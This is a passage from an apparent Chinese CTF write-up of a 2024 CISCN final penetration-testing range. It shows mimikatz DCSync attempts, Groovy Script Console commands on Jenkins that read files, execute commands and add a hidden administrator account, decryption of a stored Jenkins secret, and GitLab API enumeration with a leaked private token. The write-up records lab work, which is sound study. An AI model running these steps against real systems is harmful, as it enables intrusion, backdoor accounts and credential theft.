Bye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # log
Using 'mimikatz.log' for logfile : OK

mimikatz(commandline) # lsadump::dcsync /user:Administrator
ERROR kuhl_m_lsadump_dcsync ; Domain not present, or doesn't look like a FQDN

mimikatz(commandline) # exit
Bye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # log
Using 'mimikatz.log' for logfile : OK

mimikatz(commandline) # creds_all
ERROR mimikatz_doLocal ; "creds_all" command of "standard" module not found !

Module :	standard
Full name :	Standard module
Description :	Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # exit
Bye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>都没啥用</p>
<p>看别人这里是<code>net user Administrator &lt;password&gt;</code>进行密码修改，然后通过WindowsRDP进行远程桌面登陆</p>
<hr>
<h2 id="RODC（Unsolved）"><a href="#RODC（Unsolved）" class="headerlink" title="RODC（Unsolved）"></a>RODC（Unsolved）</h2><p>不懂，好像是smb密码喷洒</p>
<p>别的师傅的非预期：</p>
<p>在WIN-OPS88桌面上有一个<code>WPS OFFICE</code>，点开后查看Recent，发现了一个表格，里面有一组账号密码。</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1370778707.png" alt="2024-07-22T06:05:09.png"></p>
<p>由于文件名带有<code>ROAdmins</code>，很容易想到是RODC相关密码，发现这些密码均能远程登陆RODC Windows的RDP</p>
<p><br>可惜我没练过渗透，不然应该能想到拿完Windows的shell后要尝试下rdp的</p>
<hr>
<h2 id="Jinkens"><a href="#Jinkens" class="headerlink" title="Jinkens"></a>Jinkens</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.16:8080  code:403 len:594    title:None<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>jenkins服务</p>
<p>测试出账密admin:admin123可以登录进去</p>
<p>在Script Console里面打Groovy脚本就行：参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6372">https://xz.aliyun.com/t/6372</a></p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105348773.png" alt="image-20240721105348773"></p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105555762.png" alt="image-20240721105555762"></p>
<p>那么同样的可以读flag</p>
<pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">String fileContents <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\Administrator\\flag\\flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721105744258.png" alt="image-20240721105744258"></p>
<p>或者执行命令：</p>
<pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">println <span class="token interpolation-string"><span class="token string">"whoami"</span></span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<br>

<p>远程桌面账密：</p>
<pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">println <span class="token interpolation-string"><span class="token string">"net user test qwer1234! /add"</span></span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
println <span class="token interpolation-string"><span class="token string">"net localgroup administrators test /add"</span></span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h2 id="Gitlab（TimeOut）"><a href="#Gitlab（TimeOut）" class="headerlink" title="Gitlab（TimeOut）"></a>Gitlab（TimeOut）</h2><p>靠，是原题：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13378">https://xz.aliyun.com/t/13378</a></p>
<p>但是最后十分钟的时候才发现，来不及了没做完，jenkins的服务还慢得要死。。</p>
<p>依旧是在Jenkins里面，进入对应选项卡，点击change password</p>
<p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721140214428.png" alt="image-20240721140214428"></p>
<p>ctrl+u找到apitoken</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&#123;AQAAABAAAAAgvBTIIfz3QQnmD8y+ncKsVDqTEsdqjxdp/rkK9tRPkckOfP9xBtu6uqckTjQJ6gJj&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>接下来用Script console解密</p>
<pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy"><span class="token function">println</span><span class="token punctuation">(</span>hudson<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Secret<span class="token punctuation">.</span><span class="token function">fromString</span><span class="token punctuation">(</span><span class="token interpolation-string"><span class="token string">"&#123;AQAAABAAAAAgvBTIIfz3QQnmD8y+ncKsVDqTEsdqjxdp/rkK9tRPkckOfP9xBtu6uqckTjQJ6gJj&#125;"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPlainText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>剩下的来不及了😭</p>
<br>

<p>有了apitoken之后就能访问gitlab的所有仓库</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token function">curl</span> <span class="token parameter variable">--header</span> <span class="token string">"PRIVATE-TOKEN: glpat-bGEgHAJDvwaPP78rsLeS"</span> <span class="token string">"http://192.168.8.42/api/v4/projects"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以获得一个巨大的返回json，通过这个json可以观察到GitLab中所有的储存库信息</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>
    <span class="token punctuation">&#123;</span>
        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">,</span>
        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoftBackup"</span><span class="token punctuation">,</span>
        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / VertexSoftBackup"</span><span class="token punctuation">,</span>
        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoftbackup"</span><span class="token punctuation">,</span>
        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/vertexsoftbackup"</span><span class="token punctuation">,</span>
        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:03:43.603Z"</span><span class="token punctuation">,</span>
        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/vertexsoftbackup.git"</span><span class="token punctuation">,</span>
        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexsoftbackup.git"</span><span class="token punctuation">,</span>
        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexsoftbackup"</span><span class="token punctuation">,</span>
        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexsoftbackup/-/blob/main/README.md"</span><span class="token punctuation">,</span>
        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-17T05:42:29.243Z"</span><span class="token punctuation">,</span>
        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>
            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>
            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>
            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>
            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>
        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5"</span><span class="token punctuation">,</span>
            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/issues"</span><span class="token punctuation">,</span>
            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/merge_requests"</span><span class="token punctuation">,</span>
            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/repository/branches"</span><span class="token punctuation">,</span>
            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/labels"</span><span class="token punctuation">,</span>
            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/events"</span><span class="token punctuation">,</span>
            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/members"</span><span class="token punctuation">,</span>
            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/5/cluster_agents"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>
            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>
            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>
            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T17:03:43.667Z"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>
        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>
        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span>
        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-17T05:42:29.243Z"</span><span class="token punctuation">,</span>
        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>
        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941cVxxrGfbYCRyHzGyNtRE"</span><span class="token punctuation">,</span>
        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>
        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>
        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>
        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>
        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>
        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>
                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#123;</span>
        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>
        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Hexo"</span><span class="token punctuation">,</span>
        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Hexo"</span><span class="token punctuation">,</span>
        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / Hexo"</span><span class="token punctuation">,</span>
        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"hexo"</span><span class="token punctuation">,</span>
        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/hexo"</span><span class="token punctuation">,</span>
        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:31.691Z"</span><span class="token punctuation">,</span>
        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"master"</span><span class="token punctuation">,</span>
        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/hexo.git"</span><span class="token punctuation">,</span>
        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/hexo.git"</span><span class="token punctuation">,</span>
        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/hexo"</span><span class="token punctuation">,</span>
        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/hexo/-/blob/master/README.md"</span><span class="token punctuation">,</span>
        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:31.661Z"</span><span class="token punctuation">,</span>
        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>
            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>
            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>
            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>
            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>
            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>
        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4"</span><span class="token punctuation">,</span>
            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/issues"</span><span class="token punctuation">,</span>
            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/merge_requests"</span><span class="token punctuation">,</span>
            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/repository/branches"</span><span class="token punctuation">,</span>
            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/labels"</span><span class="token punctuation">,</span>
            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/events"</span><span class="token punctuation">,</span>
